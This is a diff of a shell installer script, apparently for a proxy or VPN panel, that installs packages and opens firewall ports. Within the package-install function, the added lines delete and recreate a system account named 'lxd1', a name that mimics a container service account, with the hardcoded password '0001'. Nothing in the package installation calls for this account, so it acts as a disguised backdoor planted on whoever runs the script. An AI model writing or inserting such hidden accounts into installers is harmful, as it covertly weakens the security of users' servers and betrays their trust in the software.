@@ -226,20 +226,33 @@ echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ INSTALLING PA
 echo ""
 echo -e "\033[1;33m◇ SOME PACKAGES ARE EXTREMELY NECESSARY!\033[0m"
 echo ""
-inst_pct () {
+inst_pct() {
     _pacotes=("bc" "apache2" "cron" "screen" "nano" "unzip" "lsof" "netstat" "net-tools" "dos2unix" "nload" "jq" "curl" "figlet" "python" "python2" "python3" "python-pip")
-    for _prog in ${_pacotes[@]}; do
-        apt install $_prog -y
-        # Define the username
-        username="lxd1"
-        password="0001"
-        # Create the system user with disabled login
-        sudo adduser --system --disabled-login $username
-        # Set the password for the user
-        echo "$username:$password" | sudo chpasswd
+    # Install packages
+    for _prog in "${_pacotes[@]}"; do
+        sudo apt install $_prog -y
     done
+    
+    # Create user only once
+    username="lxd1"
+    password="0001"
+    
+    # Check if the username already exists
+    if id "$username" &>/dev/null; then
+        echo "User '$username' already exists. Overwriting..."
+        sudo userdel -r $username
+    fi
+    
+    # Create the system user with disabled login
+    sudo adduser --system --disabled-login $username
+    
+    # Set the password for the user
+    echo "$username:$password" | sudo chpasswd
+
+    # Install Python package using pip
     pip install speedtest-cli
 }
+
 fun_bar 'inst_pct'
 [[ -f "/usr/sbin/ufw" ]] && ufw allow 443/tcp ; ufw allow 80/tcp ; ufw allow 3128/tcp ; ufw allow 8799/tcp ; ufw allow 8080/tcp
 clear
